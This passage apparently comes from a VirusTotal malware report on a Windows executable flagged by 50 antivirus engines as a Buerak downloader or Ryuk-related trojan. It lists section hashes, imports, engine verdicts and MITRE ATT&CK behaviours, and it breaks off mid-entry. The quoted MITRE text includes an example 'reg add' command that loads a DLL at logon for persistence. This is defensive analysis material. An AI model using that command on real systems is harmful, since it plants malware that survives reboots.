            "virtual_address": 434176,
            "entropy": 4.46,
            "raw_size": 4608,
            "flags": "r",
            "virtual_size": 4522,
            "md5": "1eb3f9fd1f072970b86fa7a6a6710c81"
          },
          {
            "name": "/77",
            "chi2": 69209.02,
            "virtual_address": 442368,
            "entropy": 5.54,
            "raw_size": 4608,
            "flags": "r",
            "virtual_size": 4254,
            "md5": "1350dd5e512331ef65ad6dd4517600ef"
          },
          {
            "name": "/89",
            "chi2": 98482.28,
            "virtual_address": 450560,
            "entropy": 4.53,
            "raw_size": 3072,
            "flags": "r",
            "virtual_size": 2888,
            "md5": "c355072d99194c43168a067d9d19e0f9"
          },
          {
            "name": "/102",
            "chi2": 11255,
            "virtual_address": 454656,
            "entropy": 4.34,
            "raw_size": 512,
            "flags": "r",
            "virtual_size": 427,
            "md5": "3a114763d633fa3fc59483e81bf819eb"
          },
          {
            "name": "/113",
            "chi2": 823662.31,
            "virtual_address": 458752,
            "entropy": 3.48,
            "raw_size": 9728,
            "flags": "r",
            "virtual_size": 9604,
            "md5": "3f46ef6fa9665c51abb2db8660235444"
          },
          {
            "name": "/124",
            "chi2": 212510.48,
            "virtual_address": 471040,
            "entropy": 2.35,
            "raw_size": 1536,
            "flags": "r",
            "virtual_size": 1152,
            "md5": "54c68a6e2e98562a7f55ecfdc7fde25c"
          }
        ],
        "import_list": [
          {
            "library_name": "ntdll.dll",
            "imported_functions": [
              "memmove",
              "sprintf",
              "strcat",
              "strcpy",
              "strncpy",
              "strrchr",
              "strtoul",
              "vsprintf",
              "ZwOpenSymbolicLinkObject"
            ]
          },
          {
            "library_name": "KERNEL32.dll",
            "imported_functions": [
              "AddAtomA",
              "CloseHandle",
              "CreateMutexA",
              "CreateSemaphoreA",
              "DeleteCriticalSection",
              "EnterCriticalSection",
              "ExitProcess",
              "FileTimeToLocalFileTime",
              "FileTimeToSystemTime",
              "FindAtomA",
              "FindClose",
              "FindFirstFileA",
              "FormatMessageA",
              "GetAtomNameA",
              "GetCommandLineA",
              "GetCurrentThreadId",
              "GetLastError",
              "GetLocalTime",
              "GetLogicalDrives",
              "GetModuleFileNameA",
              "GetModuleHandleA",
              "GetProcAddress",
              "GetStartupInfoA",
              "InitializeCriticalSection",
              "InterlockedDecrement",
              "InterlockedIncrement",
              "LeaveCriticalSection",
              "LocalFree",
              "OutputDebugStringA",
              "QueryPerformanceCounter",
              "QueryPerformanceFrequency",
              "ReleaseMutex",
              "ReleaseSemaphore",
              "SetLastError",
              "SetUnhandledExceptionFilter",
              "Sleep",
              "TlsAlloc",
              "TlsFree",
              "TlsGetValue",
              "TlsSetValue",
              "VirtualProtect",
              "VirtualQuery",
              "WaitForSingleObject",
              "WideCharToMultiByte"
            ]
          },
          {
            "library_name": "msvcrt.dll",
            "imported_functions": [
              "__getmainargs",
              "__p__environ",
              "__p__fmode",
              "__set_app_type",
              "_cexit",
              "_close",
              "_errno",
              "_filelength",
              "_iob",
              "_onexit",
              "_open",
              "_read",
              "_setmode",
              "_stat",
              "_write",
              "abort",
              "atexit",
              "calloc",
              "fclose",
              "fgets",
              "fopen",
              "fputc",
              "fputs",
              "fread",
              "free",
              "fseek",
              "ftell",
              "fwrite",
              "malloc",
              "memchr",
              "realloc",
              "rewind",
              "signal",
              "strcmp",
              "strerror",
              "vfprintf"
            ]
          },
          {
            "library_name": "GDI32.dll",
            "imported_functions": [
              "BitBlt",
              "CreateCompatibleBitmap",
              "CreateCompatibleDC",
              "DeleteDC",
              "DeleteObject",
              "GetStockObject",
              "SelectObject",
              "StretchDIBits"
            ]
          },
          {
            "library_name": "USER32.dll",
            "imported_functions": [
              "BeginPaint",
              "CreateWindowExA",
              "DefWindowProcA",
              "DispatchMessageA",
              "EndPaint",
              "GetDC",
              "GetDesktopWindow",
              "GetKeyState",
              "GetMessageA",
              "GetSystemMetrics",
              "GetWindowRect",
              "LoadCursorA",
              "LoadIconA",
              "MessageBoxA",
              "MoveWindow",
              "PostQuitMessage",
              "RegisterClassA",
              "ReleaseDC",
              "SetActiveWindow",
              "SetWindowPos",
              "ShowWindow",
              "TranslateMessage",
              "UpdateWindow",
              "wsprintfA"
            ]
          }
        ]
      },
      "magic": "PE32 executable (GUI) Intel 80386, for MS Windows",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 4,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 50,
        "undetected": 19
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "malicious",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": "W32.Common.4697BD9C",
          "method": "blacklist",
          "engine_update": "20240120"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.Win32.Buerak.trLm",
          "method": "blacklist",
          "engine_update": "20240120"
        },
        "tehtris": {
          "category": "undetected",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240120"
        },
        "Cynet": {
          "category": "undetected",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.28",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240106"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240120"
        },
        "Skyhigh": {
          "category": "malicious",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": "Generic trojan.kv",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "McAfee": {
          "category": "malicious",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": "Artemis!5AF409FE584B",
          "method": "blacklist",
          "engine_update": "20240120"
        },
        "Cylance": {
          "category": "malicious",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": "unsafe",
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "Trojan.Agent.EXHD",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Sangfor": {
          "category": "malicious",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": "Downloader.Win32.Agent.V8cv",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "CrowdStrike": {
          "category": "malicious",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": "win/malicious_confidence_100% (W)",
          "method": "blacklist",
          "engine_update": "20231026"
        },
        "Alibaba": {
          "category": "malicious",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": "Trojan:Any/UnSafe.a",
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "malicious",
          "engine_name": "K7GW",
          "engine_version": "12.137.50793",
          "result": "Trojan ( 005704ef1 )",
          "method": "blacklist",
          "engine_update": "20240120"
        },
        "K7AntiVirus": {
          "category": "malicious",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.137.50793",
          "result": "Trojan ( 005704ef1 )",
          "method": "blacklist",
          "engine_update": "20240120"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "Trojan.Agent.EXHD",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.622",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": "Packed.Generic.554",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Elastic": {
          "category": "malicious",
          "engine_name": "Elastic",
          "engine_version": "4.0.125",
          "result": "malicious (moderate confidence)",
          "method": "blacklist",
          "engine_update": "20240115"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28600",
          "result": "a variant of Win32/Kryptik.HGOV",
          "method": "blacklist",
          "engine_update": "20240120"
        },
        "APEX": {
          "category": "undetected",
          "engine_name": "APEX",
          "engine_version": "6.491",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Paloalto": {
          "category": "undetected",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240120"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "Trojan-Downloader.Win32.Buerak.tg",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Trojan.Agent.EXHD",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "NANO-Antivirus": {
          "category": "malicious",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": "Trojan.Win32.Buerak.hyhcbj",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Trojan.Agent.EXHD",
          "method": "blacklist",
          "engine_update": "20240120"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "Win32:DangerousSig [Trj]",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Malware.Win32.Gencirc.13bb48f8",
          "method": "blacklist",
          "engine_update": "20240120"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240120"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "MalCert-S.CN (A)",
          "method": "blacklist",
          "engine_update": "20240120"
        },
        "F-Secure": {
          "category": "undetected",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": "Trojan.Encoder.32841",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Zillya": {
          "category": "malicious",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5037",
          "result": "Downloader.Buerak.Win32.158",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": "Ransom.Win32.RYUK.YXAK-A",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": "Troj/BuerLd-A",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "SentinelOne": {
          "category": "undetected",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "240119-02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Jiangmin": {
          "category": "malicious",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": "TrojanDownloader.Buerak.hv",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Webroot": {
          "category": "malicious",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": "W32.Trojan.Gen",
          "method": "blacklist",
          "engine_update": "20240120"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1705714228",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20240120"
        },
        "Avira": {
          "category": "undetected",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": "Trojan[Downloader]/Win32.Buerak",
          "method": "blacklist",
          "engine_update": "20240120"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Gridinsoft": {
          "category": "malicious",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.155.174",
          "result": "Trojan.Win32.Agent.oa!s1",
          "method": "blacklist",
          "engine_update": "20240120"
        },
        "Xcitium": {
          "category": "malicious",
          "engine_name": "Xcitium",
          "engine_version": "36361",
          "result": "Malware@#24vbfjwed3nbn",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "result": "Trojan:Win64/CryptInject.KSH!cert",
          "method": "blacklist",
          "engine_update": "20240120"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "Trojan-Downloader.Win32.Buerak.tg",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.37200B:27.34626",
          "result": "Trojan.Agent.EXHD",
          "method": "blacklist",
          "engine_update": "20240120"
        },
        "Varist": {
          "category": "malicious",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": "W32/Kryptik.CCR.gen!Eldorado",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "result": "Malware/Win32.Generic.C4212484",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "2.0.0.8",
          "result": "Trojan.Downloader.Buerak.A",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "TACHYON": {
          "category": "malicious",
          "engine_name": "TACHYON",
          "engine_version": "2024-01-20.01",
          "result": "Ransom/W32.Ryuk.407504",
          "method": "blacklist",
          "engine_update": "20240120"
        },
        "VBA32": {
          "category": "malicious",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": "TrojanDownloader.Buerak",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Malwarebytes": {
          "category": "malicious",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": "Generic.Malware/Suspicious",
          "method": "blacklist",
          "engine_update": "20240120"
        },
        "Panda": {
          "category": "malicious",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": "Trj/CI.A",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": "Ransom.Win32.RYUK.YXAK-A",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Downloader.BuerLoader!1.CD52 (CLASSIC)",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Yandex": {
          "category": "malicious",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": "Trojan.Kryptik!fZFDnug3arA",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "Trojan-Banker.Emotet",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.Malware.74788014.susgen",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "W32/GenCBL.BN!tr",
          "method": "blacklist",
          "engine_update": "20240120"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": "Win32:DangerousSig [Trj]",
          "method": "blacklist",
          "engine_update": "20240119"
        },
        "Cybereason": {
          "category": "undetected",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "DeepInstinct": {
          "category": "malicious",
          "engine_name": "DeepInstinct",
          "engine_version": "5.0.0.8",
          "result": "MALICIOUS",
          "method": "blacklist",
          "engine_update": "20240116"
        }
      },
      "reputation": -138
    },
    "type": "file",
    "id": "3ee706f07d13cb9e617eac2b4442479634ab48f11005568c739c6dcab75052a4",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/3ee706f07d13cb9e617eac2b4442479634ab48f11005568c739c6dcab75052a4"
    }
  },
  "mitre": {
    "data": {
      "Zenbox": {
        "tactics": [
          {
            "description": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
            "techniques": [
              {
                "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Searches for user specific document files"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1005/",
                "id": "T1005",
                "name": "Data from Local System"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0009/",
            "id": "TA0009",
            "name": "Collection"
          },
          {
            "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "techniques": [
              {
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: .sys) to disk, the payload can be loaded and registered via Native API functions such as CreateServiceW() (or manually via functions such as ZwLoadDriver() and ZwSetValueKey()), by creating the required service Registry values (i.e. Modify Registry), or by using command-line utilities such as PnPUtil.exe. Adversaries may leverage these drivers as Rootkits to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of Exploitation for Privilege Escalation.\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through Service Execution. To make detection analysis more challenging, malicious services may also incorporate Masquerade Task or Service (ex: using a service and/or payload name related to a legitimate OS or benign software component).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Uses net.exe to stop services"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1543/003/",
                "id": "T1543.003",
                "name": "Windows Service"
              },
              {
                "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\nThe following run keys are created by default on Windows systems:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\nRun keys may exist under multiple hives. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" \nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\nThe following Registry keys can be used to set startup folder items for persistence:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n\nThe following Registry keys can control automatic startup of services during boot:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n\nPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run automatically for the currently logged-on user.\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Stores files to the Windows startup directory"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1547/001/",
                "id": "T1547.001",
                "name": "Registry Run Keys / Startup Folder"
              },
              {
                "description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Uses cacls to modify the permissions of files"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1574/010/",
                "id": "T1574.010",
                "name": "Services File Permissions Weakness"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0003/",
            "id": "TA0003",
            "name": "Persistence"
          },
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (services.exe) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities such as sc.exe and Net.\nPsExec can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API. Tools such as PsExec and sc.exe can accept remote servers as arguments and may be used to conduct remote execution.\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with Windows Service during service persistence or privilege escalation.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Uses net.exe to stop services"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1569/002/",
                "id": "T1569.002",
                "name": "Service Execution"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Writes ini files"
                  },
                  {
                    "severity": "INFO",
                    "description": "Enumerates the file system"
                  },
                  {
                    "severity": "INFO",
                    "description": "Searches for user specific document files"
                  },
                  {
                    "severity": "INFO",
                    "description": "Reads ini files"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1083/",
                "id": "T1083",
                "name": "File and Directory Discovery"
              },
              {
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Queries a list of all running processes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1057/",
                "id": "T1057",
                "name": "Process Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nExample commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment. For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the DescribeSecurityGroups action with various request parameters. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Checks if the current process is being debugged"
                  },
                  {
                    "severity": "INFO",
